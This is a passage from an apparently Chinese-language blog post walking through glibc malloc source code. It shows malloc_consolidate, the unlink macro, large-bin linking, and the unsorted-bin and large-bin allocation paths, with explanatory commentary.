class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">    yet been initialized, in which case do so below</span><br><span class="hljs-comment">  */</span><br> <br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br>    clear_fastchunks(av);<br><br>    unsorted_bin = unsorted_chunks(av);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">      then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">      placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">      reused anyway.</span><br><span class="hljs-comment">    */</span><br><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;    <br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">//将p = *fb，然后 *fb = 0，p是该fast bin的第一个fast chunk，随后根据p遍历整个fast bin</span><br>        <span class="hljs-comment">//</span><br>        p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>              <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>                    size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                      prevsize = p-&gt;prev_size;<br>                      size += prevsize;<br>                      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>                      unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>                      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                        size += nextsize;<br>                        unlink(av, nextchunk, bck, fwd);<br>                      &#125; <span class="hljs-keyword">else</span><br>                        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>                      first_unsorted = unsorted_bin-&gt;fd;<br>                      unsorted_bin-&gt;fd = p;<br>                      first_unsorted-&gt;bk = p;<br><br>                      <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>                        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                      &#125;<br><br>                      set_head(p, size | PREV_INUSE);<br>                      p-&gt;bk = unsorted_bin;<br>                      p-&gt;fd = first_unsorted;<br>                      set_foot(p, size);<br>                    &#125;<br><br>                    <span class="hljs-keyword">else</span> &#123;<br>                      size += nextsize;<br>                      set_head(p, size | PREV_INUSE);<br>                      av-&gt;top = p;<br>                    &#125;<br><br>              &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="关于unlink"><a href="#关于unlink" class="headerlink" title="关于unlink"></a>关于unlink</h5><p>下面的unlink操作主要分large chunk和非large chunk</p><p>1.非large chunk统一的操作就是仅操作fd和bk，将其从双链中摘下即可；</p><p>2.如果是large chunk，就是多一个操作fd_nextsize和bk_nextsize：</p><p>-如果fd_nextsize非空，首先检查fd_nextsize和bk_nextsize组成的双链是正确的；因为如果为空，它就没有这一步；</p><p>-p-&gt;fd-&gt;fd_nextsize如果为空，则p-&gt;fd是它的成员，而且说明P是它的头部：</p><p>–如果P是large bin仅存的一种大小的头部，那么fd会成为新的头部，fd_nextsize指向自己；</p><p>–如果P是非仅存的一种大小的头部，那么就让p-&gt;fd接管即可；</p><p>-p-&gt;fd-&gt;fd_nextsize如果非空，说明p-&gt;fd要么也是一个头部，要么就是large bin的头；</p><p>–就按照fd_nextsize所在的一条双向链表进行接管</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                                      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                                      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;                                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                                  \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                                  \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)                      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \</span><br><span class="hljs-meta">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">          malloc_printerr (check_action,                      \</span><br><span class="hljs-meta">                   <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">                   P, AV);                          \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;<span class="hljs-comment">//判断FD是否为成员                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                if (P-&gt;fd_nextsize == P)                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                else &#123;                                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                  &#125;                                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">              &#125; else &#123;                                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span></span><br><span class="hljs-comment"><span class="hljs-meta">              &#125;                                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">          &#125;                                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">      &#125;                                          \</span></span><br><span class="hljs-comment"><span class="hljs-meta">&#125;</span></span><br></code></pre></td></tr></table></figure><h5 id="关于large-bin中的组织关系"><a href="#关于large-bin中的组织关系" class="headerlink" title="关于large bin中的组织关系"></a>关于large bin中的组织关系</h5><p>当large bin只有一个large chunk时，这个large chunk作为头部，通过fd和bk和large bin组成双向循环链表；fd_nextsize和bk_nextsize由于没有其他大小的large chunk，暂时都指向自己；</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113819020.png"></p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113830825.png"></p><p>关于large bin 中的large chunk组织如下：黑色是fd和bk指针；绿色是fd_nextsize和bk_nextsize指针；</p><p>其中的large chunk之间还是通过fd和bk指针来相互连接，和bin共同构成双向循环链表；</p><p>–large bin的fd指向本bin中最大的large chunk的头部；large bin的bk指向本bin中最小的large chunk的头部；</p><p>然后在此基础上通过fd_nextsize和bk_nextsize两个指针进而抽象出第二条双向循环链表：</p><p>–large bin中的large chunk只有头部chunk的fd_nextsize和bk_nextsize非空，用于连接各个大小chunk的头部；【下面所讲的头部其实还是chunk，只是它的*_nextsize非空我们称其为头部】</p><p>–如果有多个同等大小的chunk，只有头部的*_nextsize非空，其它是NULL；</p><p>–fd_nextsize指向比当前小且大小最接近的chunk，bk_nextsize指向比当前大且最接近的chunk。</p><p>–由于是双向循环链表，最大chunk头部的bk_nextsize指向最小chunk的头部；最小chunk头部的fd_nextsize指向最大chunk的头部；</p><p>还有就是插入时的操作：</p><p>假定要插入的chunk为p，如果large  bin中已经存在同等大小chunk，那么头部已经存在，此时p是插到头部前面，也就是头部-&gt;fd这个位置；</p><p>如果large bin中不存在该大小的chunk，那么该chunk就作为头部；插入的位置是根据其大小通过fd和bk放到双向链表中的，如下面所示，总体上是由大小顺序的；</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113904645.png"></p><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><p>下面会依次进入while循环(处理unsorted_bin)、if判断是否为large chunk、for循环使用更大的chunk来分配、usetop等几部分</p><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>1.Line2取Victim &#x3D; unsorted_bin-&gt;bk，并判断unsorted是否为空</p><p>2.Line5-8是检查Victim的大小符合规范，av-&gt;system_mem表示当前分配区已经分配内存的大小</p><p>下面的while循环基本上是做以下几个事情：</p><p>在一定的迭代次数内：</p><p>遍历unsorted bin中的chunk，如果既不是unsorted中仅存的last_remainder，也不是和需要的大小恰好一致，就将其放到对应的bin中去</p><p>对应last_remainder或者大小一致的情况：</p><p>如果符合last_remainder相关要求，就可以进行分配；或者大小正好符合所需的，就可以直接返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs C">      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><h5 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h5><p>到此处，先说明一下：</p><p>fast chunk的情况如果有就已经在开头返回了；</p><p>small chunk在开头就尝试从small bin中进行分配，如果没成功，上面在处理unsorted时又进行了一遍，如果还没有分配，说明大小没有一致的，只能后面尝试用更大的进行分配；</p><p>large chunk经过unsorted简单大小比较分配后，如果没有一致的chunk就进入下面large bin中尝试分配</p><p>这部分就是处理large chunk这种情况：</p><p>1.首先找到对应大小对应的large bin</p><p>2.然后判断，该large bin中是否有合适的chunk可分配（细节地处理是否为一种大小chunk的头chunk）</p><p>3.将victim从large bin中摘除，并且进行切割操作，如果太小就一起给了，如果还能剩下，那么剩下的部分就放到unsorted中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>  &#123;<br>    bin = bin_at (av, idx);<br><br>    <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>    <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>      &#123;<br>            victim = victim-&gt;bk_nextsize;<br>            <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>              victim = victim-&gt;bk_nextsize;<br><br>            <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">              list does not have to be rerouted.  */</span><br>            <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>              victim = victim-&gt;fd;<br><br>            remainder_size = size - nb;<br>            unlink (av, victim, bck, fwd);<br><br>            <span class="hljs-comment">/* Exhaust */</span><br>            <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>              &#123;<br>                set_inuse_bit_at_offset (victim, size);<br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                  victim-&gt;size |= NON_MAIN_ARENA;<br>              &#125;<br>            <span class="hljs-comment">/* Split */</span><br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                    remainder = chunk_at_offset (victim, nb);<br>                    <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                      have to perform a complete insert here.  */</span><br>                    bck = unsorted_chunks (av);<br>                    fwd = bck-&gt;fd;<br>                      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                      &#123;<br>                        errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                        <span class="hljs-keyword">goto</span> errout;<br>                      &#125;<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                      &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                      &#125;<br>                    set_head (victim, nb | PREV_INUSE |<br>                              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head (remainder, remainder_size | PREV_INUSE);<br>                    set_foot (remainder, remainder_size);<br>              &#125;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="for循环-1"><a href="#for循环-1" class="headerlink" title="for循环"></a>for循环</h5><p>到这里，说明前面都没有分配成功，对于small chunk和large chunk只能先尝试使用更大的chunk进行分配；</p><p>下面就是用更大的chunk来进行分配，从bin的角度去搜索</p><p>下面首先就是取相邻的bin，获取对应的block、map然后进入for循环</p><p>其实值得注意的是“bit &gt; map || bit &#x3D;&#x3D; 0”这个判断条件：</p><p>bit是当前bin对应bitmap中的位置，map是当前block的真实map值，这种情况好理解，bit&gt;map说明当前block中还有bin中存在chunk</p><p>bit &#x3D;&#x3D; 0 这个条件为了应对，下面那种误报情况，如果误报的bin恰好对应block中的31位(2^31的指数)，然后消除误报后，bit&lt;&lt;1此时会溢出为0</p><p>就是找到一个最接近的非空的bin，取其中bin-&gt;bk，进行尝试切割；这边还有主要就是如果申请的small chunk，切割剩下的chunk如果大小还能独自存在，那就将其设置为last_remainder</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 